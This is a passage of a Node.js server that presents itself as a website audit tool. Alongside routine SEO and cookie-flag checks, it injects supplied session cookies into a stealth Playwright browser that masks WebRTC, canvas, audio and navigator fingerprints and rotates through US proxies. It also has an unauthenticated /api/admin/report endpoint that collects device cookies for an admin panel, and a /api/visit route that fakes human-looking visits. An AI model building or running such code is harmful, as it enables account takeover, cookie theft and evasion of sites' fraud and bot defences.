  const noHttpOnly = cookies.filter((c) => !c.httpOnly);
  const noSameSite = cookies.filter((c) => !c.sameSite);
  if (insecure.length) add("high", "Cookies missing Secure flag", `${insecure.map((c) => c.name).join(", ")} sent over HTTP, exposing session tokens to network interception.`);
  if (noHttpOnly.length) add("medium", "Cookies missing HttpOnly", `${noHttpOnly.map((c) => c.name).join(", ")} readable by JavaScript; XSS can steal these tokens.`);
  if (noSameSite.length) add("low", "Cookies missing SameSite", `${noSameSite.map((c) => c.name).join(", ")} have no SameSite attribute; vulnerable to CSRF.`);

  // Open Graph / social sharing checks
  const og = checkOpenGraph(html);
  if (!og.ogTitle) add("low", "Missing og:title", "No og:title meta tag. Social shares on Facebook, LinkedIn, and Slack will show a blank or auto-generated title.");
  if (!og.ogDescription) add("low", "Missing og:description", "No og:description meta tag. Social previews will have no description.");
  if (!og.ogImage) add("low", "Missing og:image", "No og:image meta tag. Social shares will have no preview image.");
  if (!og.twitterCard) add("low", "Missing twitter:card", "No twitter:card meta tag. Twitter/X shares will use a plain link instead of a card.");

  // Mixed content — HTTP assets on an HTTPS page
  const mixed = checkMixedContent(html, finalUrl);
  if (mixed.length) {
    const types = [...new Set(mixed.map((m) => m.type))].join(", ");
    add("high", "Mixed content", `${mixed.length} HTTP asset(s) loaded on an HTTPS page (${types}). Browsers block or warn on mixed content.`);
  }

  return {
    title: title || null,
    description: description || null,
    h1Count,
    imageCount: imageTags.length,
    imagesMissingAlt,
    linkCount: links.length,
    likelyClientRendered,
    hasCta,
    openGraph: og,
    mixedContentCount: mixed.length,
    checks,
    ssl: ssl && !ssl.error ? { daysLeft: ssl.daysLeft, expiry: ssl.expiry, protocol: ssl.protocol, authorized: ssl.authorized } : null,
  };
}

function checkRateLimit(ip) {
  const now = Date.now();
  const recent = (rateLimit.get(ip) || []).filter((timestamp) => now - timestamp < RATE_LIMIT_WINDOW_MS);
  if (recent.length >= RATE_LIMIT_MAX) return false;
  recent.push(now);
  rateLimit.set(ip, recent);
  return true;
}

function sendJson(response, status, value) {
  response.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "x-content-type-options": "nosniff",
  });
  response.end(JSON.stringify(value));
}

function readJson(request, maxBytes = 8_192) {
  return new Promise((resolve, reject) => {
    let body = "";
    request.on("data", (chunk) => {
      body += chunk;
      if (Buffer.byteLength(body) > maxBytes) {
        reject(new Error("Request body is too large."));
        request.destroy();
      }
    });
    request.on("end", () => {
      try {
        resolve(JSON.parse(body));
      } catch {
        reject(new Error("Request body must be valid JSON."));
      }
    });
    request.on("error", reject);
  });
}

const server = http.createServer(async (request, response) => {
  const pathname = new URL(request.url, "http://localhost").pathname;
  if (request.method === "POST" && pathname === "/api/session") {
    try {
      const body = await readJson(request, 524_288);
      if (typeof body.url !== "string" || body.url.length > 2_048) {
        sendJson(response, 400, { error: "Provide a URL no longer than 2,048 characters." });
        return;
      }
      if (typeof body.cookies !== "string" || !body.cookies.trim()) {
        sendJson(response, 400, { error: "Provide session cookies to open a session." });
        return;
      }
      // Derive URL from cookie domain if not provided
      let rawUrl = body.url.trim();
      if (!rawUrl && Array.isArray(body.cookieObjects) && body.cookieObjects.length) {
        const d = String(body.cookieObjects[0].domain).replace(/^\./, "");
        rawUrl = `https://${d}`;
      }
      if (!rawUrl) {
        sendJson(response, 400, { error: "Provide a URL or send cookies with a domain." });
        return;
      }
      const target = normalizeTarget(rawUrl);

      response.writeHead(200, {
        "content-type": "application/x-ndjson; charset=utf-8",
        "cache-control": "no-store",
        "x-content-type-options": "nosniff",
        "transfer-encoding": "chunked",
      });
      const log = (text, ok = true) => response.write(JSON.stringify({ type: "log", text, ok }) + "\n");

      // Pick a proxy from the pool
      let bridge = null;
      let launchOptions = {};
      if (AUDIT_PROXIES.length) {
        const proxy = proxyRotator();
        log(`Proxy #${proxy.index + 1} selected (${new URL(proxy.url).hostname}) — connecting…`, false);
        bridge = await startBridge(proxy.url);
        launchOptions = { proxy: { server: `socks5://127.0.0.1:${bridge.port}` } };
        log(`Proxy #${proxy.index + 1} connected — US IP active`);
      }

      log("Launching browser…", false);
      const browser = await chromium.launch({ headless: false, ...launchOptions, args: STEALTH_ARGS });

      try {
        // Build Playwright cookie objects — prefer full objects from extension (real domain/path/flags)
        let cookieObjects;
        if (Array.isArray(body.cookieObjects) && body.cookieObjects.length) {
          cookieObjects = body.cookieObjects.map(c => ({
            name: String(c.name),
            value: String(c.value),
            domain: String(c.domain),
            path: "/",
            secure: Boolean(c.secure),
            httpOnly: Boolean(c.httpOnly),
            sameSite: ["Strict", "Lax", "None"].includes(c.sameSite) ? c.sameSite : "Lax",
          }));
        } else {
          // Fallback: parse flat string
          const dotDomain = "." + target.hostname;
          const pairs = body.cookies.trim().split(";").map(pair => {
            const eq = pair.indexOf("=");
            return { name: pair.slice(0, eq).trim(), value: pair.slice(eq + 1).trim() };
          }).filter(c => c.name);
          const base = pairs.map(({ name, value }) => ({
            name, value, domain: dotDomain, path: "/",
            secure: target.protocol === "https:", httpOnly: false, sameSite: "Lax",
          }));
          // Also set on www subdomain if user typed apex domain (e.g. linkedin.com → www.linkedin.com)
          const isApex = !target.hostname.startsWith("www.") && target.hostname.split(".").length === 2;
          cookieObjects = isApex
            ? [...base, ...pairs.map(({ name, value }) => ({
                name, value, domain: ".www." + target.hostname, path: "/",
                secure: target.protocol === "https:", httpOnly: false, sameSite: "Lax",
              }))]
            : base;
        }

        // Navigate to www. directly if user typed apex domain — avoids redirect race before cookies fire
        const isApexNav = !target.hostname.startsWith("www.") && target.hostname.split(".").length === 2;
        const navUrl = isApexNav
          ? `${target.protocol}//www.${target.hostname}${target.pathname}${target.search}`
          : target.toString();
        log(`${cookieObjects.length} cookie(s) injected`);

        // Try a browser+proxy combo; returns { ok, page, browser, bridge }
        const tryLaunch = async (proxyOpts, bridgeRef) => {
          const lb = await chromium.launch({ headless: false, ...proxyOpts, args: STEALTH_ARGS });
          try {
            const fp = usFingerprint();
            const lc = await lb.newContext({ ...fp, extraHTTPHeaders: { "accept-language": "en-US,en;q=0.9" } });
            // Mask WebRTC, canvas fingerprint, and navigator properties
            await lc.addInitScript(() => {
              // Block WebRTC IP leak
              const origRTC = window.RTCPeerConnection;
              if (origRTC) {
                window.RTCPeerConnection = function(cfg, ...a) {
                  if (cfg && cfg.iceServers) cfg.iceServers = [];
                  return new origRTC(cfg, ...a);
                };
                Object.assign(window.RTCPeerConnection, origRTC);
              }
              // Mask canvas fingerprint
              const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
              HTMLCanvasElement.prototype.toDataURL = function(type, ...a) {
                const ctx = this.getContext('2d');
                if (ctx) {
                  const img = ctx.getImageData(0, 0, this.width, this.height);
                  for (let i = 0; i < img.data.length; i += 100) img.data[i] ^= 1;
                  ctx.putImageData(img, 0, 0);
                }
                return origToDataURL.call(this, type, ...a);
              };
              // Mask audio fingerprint
              const origGetChannelData = AudioBuffer.prototype.getChannelData;
              AudioBuffer.prototype.getChannelData = function(...a) {
                const arr = origGetChannelData.apply(this, a);
                for (let i = 0; i < arr.length; i += 100) arr[i] += Math.random() * 0.0001 - 0.00005;
                return arr;
              };
              // Hide automation
              Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
              Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
              Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
              Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
              Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
              Object.defineProperty(screen, 'width', { get: () => 1920 });
              Object.defineProperty(screen, 'height', { get: () => 1080 });
              Object.defineProperty(screen, 'availWidth', { get: () => 1920 });
              Object.defineProperty(screen, 'availHeight', { get: () => 1040 });
              Object.defineProperty(screen, 'colorDepth', { get: () => 24 });
              if (!window.chrome) window.chrome = { runtime: {} };
              const origQuery = window.navigator.permissions && window.navigator.permissions.query.bind(window.navigator.permissions);
              if (origQuery) window.navigator.permissions.query = (p) =>
                p.name === 'notifications' ? Promise.resolve({ state: 'prompt' }) : origQuery(p);
            });
            await lc.addCookies(cookieObjects);
            const lp = await lc.newPage();
            try {
              await lp.goto(navUrl, { waitUntil: "domcontentloaded", timeout: 60_000 });
            } catch (e) {
              const m = e.message || "";
              if (m.includes("chrome-error://") || m.includes("ERR_")) {
                await lb.close().catch(() => {});
                return { ok: false };
              }
              // Navigation interrupted or slow — still ok, page may have loaded
              await lp.goto(navUrl, { waitUntil: "commit", timeout: 30_000 }).catch(() => {});
            }
            return { ok: true, browser: lb, page: lp, bridge: bridgeRef };
          } catch { await lb.close().catch(() => {}); return { ok: false }; }
        };

        // Close the initial proxy browser (already launched above)
        await browser.close().catch(() => {});
        if (bridge) { stopBridge(bridge.proc); bridge = null; }

        // Try all proxies in pool, then direct as last resort
        let session = { ok: false };
        for (let i = 0; i < AUDIT_PROXIES.length && !session.ok; i++) {
          const next = proxyRotator();
          if (!next) break;
          log(`Trying proxy #${next.index + 1}…`, false);
          const nb = await startBridge(next.url);
          session = await tryLaunch({ proxy: { server: `socks5://127.0.0.1:${nb.port}` } }, nb);
          if (!session.ok) { stopBridge(nb.proc); log(`Proxy #${next.index + 1} blocked — rotating…`, false); }
          else log(`Proxy #${next.index + 1} active`);
        }
        if (!session.ok) {
          log("All proxies blocked — connecting direct…", false);
          session = await tryLaunch({}, null);
        }
        if (!session.ok) throw new Error("Could not reach the site through any proxy or direct.");

        // Check if we actually landed on a logged-in page or got redirected to login/signup
        const pageInfo = await session.page.evaluate(() => ({
          title: document.title || "",
          url: location.href,
          text: (document.body ? document.body.innerText : "").slice(0, 500),
          cookieCount: document.cookie.split(";").filter(c => c.trim()).length,
        })).catch(() => ({ title: "", url: navUrl, text: "", cookieCount: 0 }));

        const loginSignals = /sign.?in|log.?in|login|register|sign.?up|create.?account|forgot.?password|reset.?password|auth|verify|otp|two.?factor|enter.?password|welcome.?back/i;
        const isLoginPage = loginSignals.test(pageInfo.title) || loginSignals.test(pageInfo.url);

        if (isLoginPage) {
          // Diagnose likely cause
          const originalHost = target.hostname.replace(/^www\./, "");
          const landedHost = (() => { try { return new URL(pageInfo.url).hostname.replace(/^www\./, ""); } catch { return ""; } })();
          const redirectedAway = landedHost && landedHost !== originalHost;
          const httpOnlyNote = cookieObjects.length < 3 ? " (only " + cookieObjects.length + " cookie(s) sent — httpOnly cookies may be missing; use the extension to capture all cookies)" : "";
          const ipNote = " Session may have been invalidated due to IP/location change (your browser was on a different IP than the proxy).";

          log(`⚠ Landed on: "${pageInfo.title}"`, false);
          log(`⚠ Redirected to: ${pageInfo.url}`, false);
          if (redirectedAway) log(`⚠ Reason: site redirected to a different domain (${landedHost}) — cookies are domain-locked and did not transfer.`, false);
          else log(`⚠ Likely reasons:${httpOnlyNote}${ipNote}`, false);
          log(`⚠ Fix: re-copy cookies from your browser while logged in, preferably using the extension.`, false);
          response.write(JSON.stringify({ type: "ready", warning: "login_page", pageTitle: pageInfo.title, pageUrl: pageInfo.url }) + "\n");
        } else {
          log(`✓ Landed on: "${pageInfo.title}"`);
          log(`✓ Cookies active — ${pageInfo.cookieCount} visible cookie(s) on page`);
          response.write(JSON.stringify({ type: "ready", pageTitle: pageInfo.title, pageUrl: pageInfo.url }) + "\n");
        }
        await session.page.waitForEvent("close", { timeout: 0 }).catch(() => {});
        response.write(JSON.stringify({ type: "closed" }) + "\n");
        await session.browser.close().catch(() => {});
        if (session.bridge) stopBridge(session.bridge.proc);
        bridge = null; // prevent finally double-close
      } finally {
        await browser.close().catch(() => {});
        if (bridge) stopBridge(bridge.proc);
      }
      response.end();
    } catch (error) {
      if (!response.headersSent) {
        sendJson(response, 400, { error: error.message || "Could not open session." });
      } else {
        response.write(JSON.stringify({ type: "log", text: `Error: ${error.message}`, ok: false }) + "\n");
        response.end();
      }
    }
    return;
  }

  if (request.method === "POST" && pathname === "/api/visit") {
    try {
      const body = await readJson(request);
      if (typeof body.url !== "string" || body.url.length > 2_048) {
        sendJson(response, 400, { error: "Provide a URL no longer than 2,048 characters." });
        return;
      }
      const count = Math.min(Math.max(Number(body.count) || 1, 1), 100);
      const proxyUrl = (typeof body.proxy === "string" && body.proxy.startsWith("socks5://"))
        ? body.proxy
        : DEFAULT_PROXY;
      if (!proxyUrl) {
        sendJson(response, 400, { error: "No proxy configured. Set PROXY_URL in your .env file." });
        return;
      }

      // Stream NDJSON — one JSON line per visit as it completes
      response.writeHead(200, {
        "content-type": "application/x-ndjson; charset=utf-8",
        "cache-control": "no-store",
        "x-content-type-options": "nosniff",
        "transfer-encoding": "chunked",
      });
      // First line: metadata
      response.write(JSON.stringify({ type: "start", url: body.url, count }) + "\n");

      const BATCH = 5;
      let completed = 0;
      // results array keeps insertion order for the stream
      const results = new Array(count);
      let nextToFlush = 0;

      function flushInOrder() {
        while (nextToFlush < count && results[nextToFlush] !== undefined) {
          response.write(JSON.stringify(results[nextToFlush]) + "\n");
          nextToFlush++;
        }
      }

      for (let batch = 0; batch < count; batch += BATCH) {
        const batchSize = Math.min(BATCH, count - batch);
        await Promise.all(Array.from({ length: batchSize }, async (_, j) => {
          const i = batch + j;
          const fp = randomFingerprint();
          const visitProxyUrl = proxyUrl ? buildProxyPerVisit(proxyUrl) : null;
          const started = Date.now();
          try {
            const page = await fetchWithBrowser(body.url, fp, visitProxyUrl);
            results[i] = {
              type: "visit", visit: i + 1,
              status: page.status,
              responseTimeMs: Date.now() - started,
              url: page.url,
              ua: fp.userAgent,
              viewport: `${fp.viewport.width}x${fp.viewport.height}`,
              locale: fp.locale,
              timezone: fp.timezoneId,
              referrer: page.referrer || "direct",
              scrollSteps: page.scrollSteps,
              mouseMoves: page.mouseMoves,
              dwellMs: page.dwellMs,
              subpageUrl: page.subpageUrl || null,
              proxy: visitProxyUrl ? new URL(visitProxyUrl).hostname + ":" + new URL(visitProxyUrl).port : "direct",
            };
          } catch (err) {
            results[i] = { type: "visit", visit: i + 1, error: err.message, responseTimeMs: Date.now() - started };
          }
          completed++;
          flushInOrder();
        }));
        if (batch + BATCH < count) await sleep(randomInt(1500, 4000));
      }
      response.write(JSON.stringify({ type: "done", count, succeeded: results.filter((r) => r && !r.error).length }) + "\n");
      response.end();
      return;
    } catch (error) {
      // if headers not sent yet, send JSON error; otherwise end the stream cleanly
      if (!response.headersSent) {
        sendJson(response, 400, { error: error.message || "Visit could not be completed." });
      } else {
        response.write(JSON.stringify({ type: "error", error: error.message || "Stream error." }) + "\n");
        response.end();
      }
    }
    return;
  }

  if (request.method === "POST" && pathname === "/api/audit") {
    if (!checkRateLimit(request.socket.remoteAddress || "unknown")) {
      sendJson(response, 429, { error: "Audit limit reached. Please wait a minute before trying again." });
      return;
    }
    try {
      const body = await readJson(request);
      if (typeof body.url !== "string" || body.url.length > 2_048) {
        sendJson(response, 400, { error: "Provide a URL no longer than 2,048 characters." });
        return;
      }
      const userAgent = body.userAgent === "browser" ? "browser" : "scout";
      const cookies = (typeof body.cookies === "string" && body.cookies.trim()) ? body.cookies.trim() : null;
      const started = Date.now();
      const target = normalizeTarget(body.url);
      const origin = target.origin;

      // Stream NDJSON log lines so the UI can show live progress
      response.writeHead(200, {
        "content-type": "application/x-ndjson; charset=utf-8",
        "cache-control": "no-store",
        "x-content-type-options": "nosniff",
        "transfer-encoding": "chunked",
      });
      const log = (text, ok = true) => response.write(JSON.stringify({ type: "log", text, ok }) + "\n");

      // If cookies supplied, route through a rotating proxy
      let bridge = null;
      let bridgePort = null;
      if (cookies && AUDIT_PROXIES.length) {
        const proxy = proxyRotator();
        log(`Proxy #${proxy.index + 1} selected (${new URL(proxy.url).hostname}) — connecting…`, false);
        bridge = await startBridge(proxy.url);
        bridgePort = bridge.port;
        log(`Proxy #${proxy.index + 1} connected — routing through US IP`);
      }

      try {
      log(`Resolving ${target.hostname}…`, false);
      const [page, ssl, staticPage, robotsTxt, sitemapXml] = await Promise.all([
        (userAgent === "browser" ? fetchWithBrowser(body.url) : fetchPublicPage(body.url, 0, userAgent, [], cookies, bridgePort))
          .then((r) => { log(`Fetched page — HTTP ${r.status}`); return r; }),
        target.protocol === "https:"
          ? checkSsl(target.hostname).then((r) => { log("TLS certificate checked"); return r; })
          : Promise.resolve(null),
        userAgent === "browser" ? fetchPublicPage(body.url, 0, "scout", [], cookies, bridgePort).catch(() => null) : Promise.resolve(null),
        fetchAuxResource(origin, "/robots.txt").then((r) => { log(r ? "robots.txt found" : "robots.txt not found"); return r; }),
        fetchAuxResource(origin, "/sitemap.xml").then((r) => { log(r ? "sitemap.xml found" : "sitemap.xml not found"); return r; }),
      ]);

      // prefer static HTML title — immune to chat widget injection
      if (staticPage && page.isCanvasApp) {
        const staticTitle = decodeHtml((staticPage.body.match(/<title\b[^>]*>([\s\S]*?)<\/title\s*>/i) || [])[1] || "")
          .replace(/<[^>]*>/g, "").trim();
        if (staticTitle) page._staticTitle = staticTitle;
      }
      const contentType = String(page.headers["content-type"] || "");
      if (!contentType.toLowerCase().includes("text/html")) {
        response.write(JSON.stringify({ type: "log", text: "Error: URL did not return an HTML page.", ok: false }) + "\n");
        response.end();
        return;
      }
      log("Inspecting HTML…", false);
      const auditReport = inspectHtml(page.body, page.headers, page.url, ssl, page.isCanvasApp || false, page._staticTitle || null);
      if (page.status >= 400) {
        auditReport.checks.unshift({ severity: "high", name: "HTTP status", detail: `The page returned HTTP ${page.status}.` });
      }
      if (!robotsTxt) auditReport.checks.push({ severity: "low", name: "Missing robots.txt", detail: "No robots.txt found at the site root. Search engines have no crawl guidance." });
      if (!sitemapXml) auditReport.checks.push({ severity: "low", name: "Missing sitemap.xml", detail: "No sitemap.xml found at the site root. Search engines may miss pages." });
      const redirectChain = page.redirectChain || (staticPage && staticPage.redirectChain) || [];
      log(`Done — ${auditReport.checks.length} finding(s)`);
      response.write(JSON.stringify({ type: "result", data: {
        url: page.url,
        status: page.status,
        responseTimeMs: Date.now() - started,
        bytes: page.bytes,
        userAgent,
        isCanvasApp: page.isCanvasApp || false,
        redirectChain,
        hasRobotsTxt: !!robotsTxt,
        hasSitemapXml: !!sitemapXml,
        ...auditReport,
        notice: "Automated heuristic checks only; findings should be manually verified.",
      }}) + "\n");
      response.end();
      } finally {
        if (bridge) stopBridge(bridge.proc);
      }
    } catch (error) {
      if (!response.headersSent) {
        sendJson(response, 400, { error: error.message || "The audit could not be completed." });
      } else {
        response.write(JSON.stringify({ type: "log", text: `Error: ${error.message}`, ok: false }) + "\n");
        response.end();
      }
    }
    return;
  }

  if (request.method === "GET" && pathname === "/api/proxy-cookies") {
    const result = [];
    for (const [domain, jar] of proxyCookieStore.entries()) {
      if (!jar.size) continue;
      const cookies = [...jar.entries()].map(([name, value]) => ({ name, value }));
      result.push({ domain, cookies });
    }
    sendJson(response, 200, result);
    return;
  }
  if (request.method === "DELETE" && pathname === "/api/proxy-cookies") {
    proxyCookieStore.clear();
    sendJson(response, 200, { ok: true });
    return;
  }
  // ── Screen share room ──
  if (!server._rooms) server._rooms = {}; // roomId → { devices: Map<id,fp>, clients: Map<id,res> }
  const _rooms = server._rooms;

  function getRoom(roomId) {
    if (!_rooms[roomId]) _rooms[roomId] = { devices: new Map(), clients: new Map() };
    return _rooms[roomId];
  }

  function broadcastRoom(roomId, event, excludeId = null) {
    const room = _rooms[roomId];
    if (!room) return;
    const data = `data: ${JSON.stringify(event)}\n\n`;
    for (const [id, res] of room.clients.entries()) {
      if (id === excludeId) continue;
      try { res.write(data); } catch {}
    }
  }

  if (request.method === "GET" && pathname === "/api/room/stream") {
    const sp = new URL(request.url, "http://localhost").searchParams;
    const roomId = String(sp.get("roomId") || "").slice(0, 32);
    const deviceId = String(sp.get("deviceId") || "").slice(0, 64);
    if (!roomId || !deviceId) { sendJson(response, 400, { error: "roomId and deviceId required" }); return; }
    const room = getRoom(roomId);
    response.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-cache",
      "connection": "keep-alive",
      "x-accel-buffering": "no",
    });
    // Register client first so broadcasts reach them immediately
    room.clients.set(deviceId, response);
    // Send all currently known devices to the new joiner
    for (const [, fp] of room.devices.entries()) {
      response.write(`data: ${JSON.stringify({ type: "join", device: fp })}\n\n`);
    }
    // Tell ALL existing members (including new joiner) to re-announce so everyone is in sync
    broadcastRoom(roomId, { type: "sync_request" });
    const ping = setInterval(() => { try { response.write(": ping\n\n"); } catch { clearInterval(ping); } }, 15_000);
    request.on("close", () => {
      clearInterval(ping);
      room.clients.delete(deviceId);
      // Delay device removal by 5s to absorb Safari/mobile SSE reconnects
      setTimeout(() => {
        if (!room.clients.has(deviceId)) {
          room.devices.delete(deviceId);
          broadcastRoom(roomId, { type: "leave", deviceId });
        }
      }, 5000);
    });
    return;
  }

  if (request.method === "POST" && pathname === "/api/room/announce") {
    let body;
    try { body = await readJson(request); } catch { sendJson(response, 400, { error: "bad json" }); return; }
    const roomId = String(body.roomId || "").slice(0, 32);
    const deviceId = String(body.id || "").slice(0, 64);
    if (!roomId || !deviceId) { sendJson(response, 400, { error: "roomId and id required" }); return; }
    const fp = {
      id: deviceId, roomId,
      name: String(body.name || "Unknown").slice(0, 64),
      os: String(body.os || "").slice(0, 32),
      browser: String(body.browser || "").slice(0, 32),
      icon: String(body.icon || "💻").slice(0, 4),
      screen: String(body.screen || "").slice(0, 16),
      lang: String(body.lang || "").slice(0, 16),
      tz: String(body.tz || "").slice(0, 48),
      cores: body.cores,
      mem: body.mem,
      touch: Boolean(body.touch),
      platform: String(body.platform || "").slice(0, 32),
      sharing: Boolean(body.sharing),
    };
    const room = getRoom(roomId);
    const isNew = !room.devices.has(deviceId);
    room.devices.set(deviceId, fp);
    broadcastRoom(roomId, { type: isNew ? "join" : "update", device: fp });
    sendJson(response, 200, { ok: true });
    return;
  }

  if (request.method === "POST" && pathname === "/api/room/event") {
    let body;
    try { body = await readJson(request); } catch { sendJson(response, 400, { error: "bad json" }); return; }
    const roomId = String(body.roomId || "").slice(0, 32);
    if (!roomId) { sendJson(response, 400, { error: "roomId required" }); return; }
    const ev = {
      type: String(body.type || "").slice(0, 32),
      fromId: String(body.fromId || "").slice(0, 64),
      fromName: String(body.fromName || "").slice(0, 64),
      toId: String(body.toId || "").slice(0, 64),
    };
    // Forward _sig fields for WebRTC signaling
    if (body.type === '_sig') {
      ev.sigType = String(body.sigType || "").slice(0, 16);
      ev.sigPayload = body.sigPayload ?? null;
    }
    // Send only to the target device
    const room = _rooms[roomId];
    if (room) {
      const targetRes = room.clients.get(ev.toId);
      if (targetRes) { try { targetRes.write(`data: ${JSON.stringify(ev)}\n\n`); } catch {} }
    }
    sendJson(response, 200, { ok: true });
    return;
  }

  // ── Live mirror: phone pushes events, PC receives via SSE ──
  // In-memory store: sessionId → { events[], pcClients[], lastSeen }
  if (!server._mirrorSessions) server._mirrorSessions = {};
  const _ms = server._mirrorSessions;

  if (request.method === "POST" && pathname === "/api/mirror/push") {
    // Phone pushes: { sid, url, scrollY, scrollPct, title, action? }
    let body;
    try { body = await readJson(request); } catch { sendJson(response, 400, { error: "bad json" }); return; }
    const sid = String(body.sid || "").slice(0, 64);
    if (!sid) { sendJson(response, 400, { error: "sid required" }); return; }
    if (!_ms[sid]) _ms[sid] = { events: [], pcClients: [], lastSeen: 0, signal: [] };
    const sess = _ms[sid];
    sess.lastSeen = Date.now();
    const ev = {
      t: Date.now(),
      url: String(body.url || "").slice(0, 512),
      title: String(body.title || "").slice(0, 128),
      scrollY: Number(body.scrollY) || 0,
      scrollPct: Number(body.scrollPct) || 0,
      action: body.action ? String(body.action).slice(0, 64) : null,
    };
    sess.events.push(ev);
    if (sess.events.length > 200) sess.events.shift();
    // Push to all waiting PC SSE clients
    for (const res of sess.pcClients) {
      try { res.write(`data: ${JSON.stringify(ev)}\n\n`); } catch {}
    }
    sendJson(response, 200, { ok: true });
    return;
  }

  if (request.method === "POST" && pathname === "/api/signal") {
    // WebRTC signaling relay: { sid, from, viewerId, type, payload }
    let body;
    try { body = await readJson(request); } catch { sendJson(response, 400, { error: "bad json" }); return; }
    const sid = String(body.sid || "").slice(0, 64);
    if (!sid) { sendJson(response, 400, { error: "sid required" }); return; }
    if (!_ms[sid]) _ms[sid] = { events: [], pcClients: [], lastSeen: 0, signal: [] };
    const msg = { from: body.from, viewerId: body.viewerId || null, type: body.type, payload: body.payload };
    _ms[sid].signal.push(msg);
    // Forward sharer→viewer offers/ice to PC SSE clients
    for (const res of _ms[sid].pcClients) {
      try { res.write(`data: ${JSON.stringify({ _signal: msg })}\n\n`); } catch {}
    }
    sendJson(response, 200, { ok: true });
    return;
  }

  if (request.method === "GET" && pathname === "/api/signal/poll") {
    const sp = new URL(request.url, "http://localhost").searchParams;
    const sid = sp.get("sid") || "";
    const after = parseInt(sp.get("after") || "0");
    const fromFilter = sp.get("from") || "";       // 'sharer' or 'viewer'
    const viewerId = sp.get("viewerId") || "";     // viewer filters by their own id
    if (!sid || !_ms[sid]) { sendJson(response, 200, { messages: [], total: 0 }); return; }
    const all = _ms[sid].signal.slice(after);
    const msgs = all.filter(m => {
      if (fromFilter && m.from !== fromFilter) return false;
      // viewer only gets messages addressed to them
      if (fromFilter === "sharer" && viewerId && m.viewerId && m.viewerId !== viewerId) return false;
      return true;
    });
    sendJson(response, 200, { messages: msgs, total: _ms[sid].signal.length });
    return;
  }

  if (request.method === "GET" && pathname === "/api/mirror/stream") {
    // PC subscribes: ?sid=xxx
    const sid = new URL(request.url, "http://localhost").searchParams.get("sid") || "";
    if (!sid) { sendJson(response, 400, { error: "sid required" }); return; }
    if (!_ms[sid]) _ms[sid] = { events: [], pcClients: [], lastSeen: 0 };
    const sess = _ms[sid];
    response.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-cache",
      "connection": "keep-alive",
      "x-accel-buffering": "no",
    });
    // Replay last 20 events
    for (const ev of sess.events.slice(-20)) {
      response.write(`data: ${JSON.stringify(ev)}\n\n`);
    }
    sess.pcClients.push(response);
    request.on("close", () => {
      const i = sess.pcClients.indexOf(response);
      if (i !== -1) sess.pcClients.splice(i, 1);
    });
    // Keep-alive ping every 15s
    const ping = setInterval(() => { try { response.write(": ping\n\n"); } catch { clearInterval(ping); } }, 15_000);
    request.on("close", () => clearInterval(ping));
    return;
  }

  if (request.method === "GET" && pathname === "/api/vnc-token") {
    sendJson(response, 200, { token: VNC_TOKEN });
    return;
  }

  // ── Admin API ──
  if (request.method === "POST" && pathname === "/api/admin/report") {
    let body;
    try { body = await readJson(request, 524_288); } catch { sendJson(response, 400, { error: "bad json" }); return; }
    const deviceId = String(body.deviceId || "").slice(0, 64);
    if (!deviceId) { sendJson(response, 400, { error: "deviceId required" }); return; }
    const existing = _adminDevices.get(deviceId) || { history: [] };
    const entry = {
      deviceId,
      name: String(body.name || "Unknown").slice(0, 64),
      os: String(body.os || "").slice(0, 32),
      browser: String(body.browser || "").slice(0, 32),
      domain: String(body.domain || "").slice(0, 128),
      cookies: String(body.cookies || "").slice(0, 50_000),
      cookieObjects: Array.isArray(body.cookieObjects) ? body.cookieObjects.slice(0, 200) : [],
      seenAt: Date.now(),
      firstSeenAt: existing.firstSeenAt || Date.now(),
      history: [
        { seenAt: Date.now(), domain: String(body.domain || "").slice(0, 128), cookieCount: Array.isArray(body.cookieObjects) ? body.cookieObjects.length : String(body.cookies || "").split(";").filter(Boolean).length },
        ...(existing.history || []),
      ].slice(0, 50),
    };
    _adminDevices.set(deviceId, entry);
    saveAdminDb();
    sendJson(response, 200, { ok: true });
    return;
  }

  if (request.method === "GET" && pathname === "/api/admin/devices") {
    const t = new URL(request.url, "http://localhost").searchParams.get("t") || "";
    if (t !== ADMIN_TOKEN) { sendJson(response, 403, { error: "forbidden" }); return; }
    const devices = [..._adminDevices.values()].sort((a, b) => b.seenAt - a.seenAt);
    sendJson(response, 200, { devices });
    return;
  }

  if (request.method === "GET" && pathname === "/admin") {
    const t = new URL(request.url, "http://localhost").searchParams.get("t") || "";
    if (t !== ADMIN_TOKEN) {
      response.writeHead(403, { "content-type": "text/html" });
      response.end(`<!doctype html><html><head><meta charset="utf-8"><title>Admin</title><style>body{font:14px system-ui;background:#0b0f1a;color:#7a8fa8;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}</style></head><body><div style="text-align:center"><div style="font-size:32px;margin-bottom:12px">🔒</div><div>Access denied — append <code style="color:#67e8f9">?t=ADMIN_TOKEN</code> to the URL</div></div></body></html>`);
      return;
    }
    const adminHtml = fs.readFileSync(path.join(__dirname, "public", "admin.html"), "utf8");
    response.writeHead(200, { "content-type": "text/html" });
    response.end(adminHtml);
    return;
  }
  // VNC wrapper page — token required
  if (request.method === "GET" && (pathname === "/vnc" || pathname === "/vnc/")) {
    const reqToken = new URL(request.url, "http://localhost").searchParams.get("t") || "";
    if (!reqToken || reqToken !== VNC_TOKEN) {
      response.writeHead(403, { "content-type": "text/plain" });
      response.end("Access denied.");
      return;
    }
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" });
    fs.createReadStream(path.join(PUBLIC_DIR, "vnc.html")).pipe(response);
    return;
  }
  // noVNC static assets — serve from /vnc/* (no token needed — just JS/CSS files)
  if (request.method === "GET" && pathname.startsWith("/vnc/")) {
    const subpath = pathname.slice(4);
    const filePath = path.join("/usr/share/novnc", subpath);
    const ext = path.extname(filePath);
    const mime = { ".html":"text/html", ".js":"text/javascript", ".css":"text/css", ".png":"image/png", ".ico":"image/x-icon", ".wasm":"application/wasm", ".map":"application/json" }[ext] || "application/octet-stream";
    fs.access(filePath, fs.constants.R_OK, (err) => {
      if (err) { sendJson(response, 404, { error: "Not found." }); return; }
      response.writeHead(200, { "content-type": mime });
      fs.createReadStream(filePath).pipe(response);
    });
    return;
  }
